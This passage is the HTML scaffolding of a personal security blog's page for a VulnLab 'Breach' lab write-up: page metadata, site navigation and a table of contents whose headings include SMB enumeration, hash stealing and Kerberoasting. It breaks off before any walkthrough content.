@@ -1,0 +1,2059 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/22/vulnlab-breach.html">
+      
+      
+        <link rel="prev" href="../07/tryhackme-include.html">
+      
+      
+        <link rel="next" href="../28/vulnlab-manage.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>VulnLab: Breach - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="VulnLab: Breach - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-breach.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/22/vulnlab-breach.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="VulnLab: Breach - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-breach.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vulnlab-breach" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              VulnLab: Breach
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../references/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About Me
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      Walkthrough
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stealing-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stealing the hash
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
